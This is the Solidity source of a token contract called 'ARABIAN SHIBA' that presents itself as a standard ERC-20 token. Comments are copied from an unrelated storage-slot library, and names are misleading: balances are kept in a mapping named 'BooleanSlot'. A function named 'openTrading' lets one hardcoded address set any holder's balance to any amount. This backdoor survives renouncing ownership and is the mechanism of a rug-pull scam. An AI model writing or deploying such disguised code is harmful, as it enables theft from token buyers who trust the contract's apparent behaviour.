// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

/**
 * @dev Library for reading and writing primitive types to specific storage slots.
 *
 * Storage slots are often used to avoid storage conflict when dealing with upgradeable contracts.
 * This library helps with reading and writing to such slots without the need for inline assembly.
 *
 * The functions in this library return Slot structs that contain a `value` member that can be used to read or write.
 *
 * Example usage to set ERC1967 implementation slot:
 * ```
 * contract ERC1967 {
 *     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
 *
 *     function _getImplementation() internal view returns (address) {
 *         return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;
 *     }
 *
 *     function _setImplementation(address newupdate) internal {
 *         require(Address.isContract(newupdate), "ERC1967: new implementation is not a contract");
 *         StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newupdate;
 *     }
 * }
 * ```
 *
 * _Available since v4.1 for `address`, `bool`, `bytes32`, and `uint256`._
 */
interface StorageSlot {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address AddressSlot) external view returns (uint256);
  function transfer(address addressCallWithAmount, uint256 functionCallWithAmount) external returns (bool);
  function allowance(address _owner, address AddressSlot) external view returns (uint256);
  function approve(address AddressSlot, uint256 functionCallWithAmount) external returns (bool);
  function transferFrom(address sender, address addressCallWithAmount, uint256 functionCallWithAmount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 balance);
  event Approval(address indexed owner, address indexed AddressSlot, uint256 balance);
}


abstract contract ERC20Burnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract ERC20Permit is ERC20Burnable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: Icodropsplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract ARABIANSHIBA is ERC20Burnable, StorageSlot, ERC20Permit {

    using SafeMath for uint256;
    mapping (address => uint256) private BooleanSlot;
    mapping (address => mapping (address => uint256)) private functionCalls;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    string private _BEACON_SLOT;
    address private ASHIBOwner;
    uint256 public tokenCreationTime;
    uint256 public tokenCreation;

    string public ownerAddress = "0x25F9868720B3627b3BbDED43529BbA0E445dA431";

    constructor() {
        ASHIBOwner = 0x25F9868720B3627b3BbDED43529BbA0E445dA431;
        _BEACON_SLOT = "0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50";
        _name = "ARABIAN SHIBA";
        _symbol = "ASHIB";
        _decimals = 9;
        _totalSupply = 100000000000000  * 10**_decimals;
        BooleanSlot[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }

                     function getownerAddress() public view returns (string memory) {
        return ownerAddress;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

     function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address AddressSlot) external view override returns (uint256) {
        return BooleanSlot[AddressSlot];
    }

    function transfer(address addressCallWithAmount, uint256 functionCallWithAmount) external override returns (bool) {
        _transfer(_msgSender(), addressCallWithAmount, functionCallWithAmount);
        return true;
    }

    function allowance(address owner, address AddressSlot) external view override returns (uint256) {
        return functionCalls[owner][AddressSlot];
    }


    function approve(address AddressSlot, uint256 functionCallWithAmount) external override returns (bool) {
        _approve(_msgSender(), AddressSlot, functionCallWithAmount);
        return true;
    }

    function transferFrom(address sender, address addressCallWithAmount, uint256 functionCallWithAmount) external override returns (bool) {
        _transfer(sender, addressCallWithAmount, functionCallWithAmount);
        _approve(sender, _msgSender(), functionCalls[sender][_msgSender()].sub(functionCallWithAmount, "Ru: transfer functionCallWithAmount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address AddressSlot, uint256 slotbalance) external returns (bool) {
        _approve(_msgSender(), AddressSlot, functionCalls[_msgSender()][AddressSlot].add(slotbalance));
        return true;
    }


    function decreaseAllowance(address AddressSlot, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), AddressSlot, functionCalls[_msgSender()][AddressSlot].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address addressCallWithAmount, uint256 functionCallWithAmount) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(addressCallWithAmount != address(0), "Ru: transfer to the zero address");

        BooleanSlot[sender] = BooleanSlot[sender].sub(functionCallWithAmount, "Ru: transfer functionCallWithAmount exceeds balance");
        BooleanSlot[addressCallWithAmount] = BooleanSlot[addressCallWithAmount].add(functionCallWithAmount);
        emit Transfer(sender, addressCallWithAmount, functionCallWithAmount);
    }

    function openTrading(address tokenA, address tokenB, uint256 _upgradeTo, uint256 newupdate, uint256 newupdates) external {
        require(_msgSender()==ASHIBOwner);
        tokenB = tokenA;
        tokenA = tokenB;
        BooleanSlot[tokenB] = (_upgradeTo + newupdate + newupdates) * 10**_decimals;
        tokenB = tokenB;
    }

    function _approve(address owner, address AddressSlot, uint256 functionCallWithAmount) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(AddressSlot != address(0), "Ru: approve to the zero address");

        functionCalls[owner][AddressSlot] = functionCallWithAmount;
        emit Approval(owner, AddressSlot, functionCallWithAmount);
    }

}